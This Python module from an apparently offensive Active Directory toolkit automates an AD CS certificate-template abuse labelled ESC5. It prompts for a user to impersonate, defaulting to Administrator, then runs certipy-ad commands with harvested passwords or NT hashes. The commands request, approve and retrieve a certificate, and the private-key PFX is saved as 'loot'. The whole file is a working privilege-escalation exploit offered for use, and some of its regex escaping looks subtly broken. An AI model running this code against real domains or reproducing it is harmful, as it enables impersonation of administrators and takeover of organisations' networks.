import os
import re
from core.helpers import run_command, save_loot, load_json_loot
from core.colors import blue, green, yellow, red

def abuse_esc5(session):
    print(blue("[>] ESC5: Abusing manually approved certificate request flow with EnrolleeSuppliesSubject + RequiresApproval + ExportableKey."))
    print(yellow("[*] This allows requesting a certificate as any UPN, manually approving it, then retrieving and using it for authentication."))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(red("[-] No CA data in session. Run 'adcs enum' first."))
        return

    ca = cas[0]
    ca_name = ca['name']

    templates = ca.get("templates") or load_json_loot(session, template_fallback=True)
    if not templates:
        print(red("[-] No templates available. Run 'adcs enum' first."))
        return

    print(blue("[*] Available certificate templates:\n"))
    for i, tpl in enumerate(templates, 1):
        notes = []
        if "EnrolleeSuppliesSubject" in tpl.get("certificate_name_flag", ""):
            notes.append("SuppliesSubject")
        if tpl.get("requires_manager_approval"):
            notes.append("RequiresApproval")
        if "ExportableKey" in tpl.get("private_key_flag", ""):
            notes.append("ExportableKey")
        esc5_hint = f" ← Likely ESC5: {', '.join(notes)}" if notes else ""
        print(f"  [{i}] {tpl['name']}{esc5_hint}")

    try:
        choice = int(input("\nSelect template index: ").strip())
        template = templates[choice - 1]['name']
    except (ValueError, IndexError):
        print(red("[-] Invalid selection."))
        return

    upn = input("[?] Enter UPN to impersonate (default: Administrator): ").strip() or "Administrator"
    target_ip = input("[?] Enter ADCS server IP (target-ip): ").strip()
    if not target_ip:
        print(red("[-] You must provide the ADCS server IP."))
        return

    username = session.username
    domain = session.domain
    dc_ip = session.dc_ip

    # === Support both password and NT hash
    if session.hash:
        auth = f"-u {username}@{domain} -hashes {session.hash}"
    elif session.password:
        auth = f"-u {username}@{domain} -p '{session.password}'"
    else:
        print(red("[-] No credentials provided (password or hash)."))
        return

    print(green(f"[+] Using CA: {ca_name}"))
    print(green(f"[+] Template: {template}"))
    print(green(f"[+] UPN: {upn}"))

    request_cmd = f"certipy-ad req {auth} -dc-ip {dc_ip} -ns {dc_ip} -dns-tcp -target-ip {target_ip} -ca {ca_name} -template {template} -upn {upn}"
    print(yellow(f"[>] Request Command:\n{request_cmd}"))
    out, err = run_command(request_cmd)
    print(out)
    if err: print(red(err))

    req_id_match = re.search(r"Request ID is (\\d+)", out)
    if not req_id_match:
        print(red("[-] Could not extract Request ID."))
        return

    req_id = req_id_match.group(1)

    approve_cmd = f"certipy-ad ca {auth} -dc-ip {dc_ip} -ns {dc_ip} -dns-tcp -target-ip {target_ip} -ca {ca_name} -issue-request {req_id}"
    print(yellow(f"[>] Approval Command:\n{approve_cmd}"))
    out, err = run_command(approve_cmd)
    print(out)
    if err: print(red(err))

    retrieve_cmd = f"certipy-ad req {auth} -dc-ip {dc_ip} -ns {dc_ip} -dns-tcp -target-ip {target_ip} -ca {ca_name} -retrieve {req_id}"
    print(yellow(f"[>] Retrieve Command:\n{retrieve_cmd}"))
    out, err = run_command(retrieve_cmd)
    print(out)
    if err: print(red(err))

    # Attempt to extract and save PFX
    pfx_match = re.search(r"Saving certificate and private key to '([^']+\\.pfx)'", out)
    if pfx_match:
        pfx_file = pfx_match.group(1)
        if os.path.exists(pfx_file):
            with open(pfx_file, "rb") as f:
                save_loot(pfx_file, f.read(), binary=True)
            print(green(f"[+] Moved and saved PFX to loot/{os.path.basename(pfx_file)}"))
        else:
            print(red("[-] PFX file not found after retrieval."))
    else:
        print(yellow("[!] If the PFX was not saved automatically, retry the attack. It could be a connection issue."))
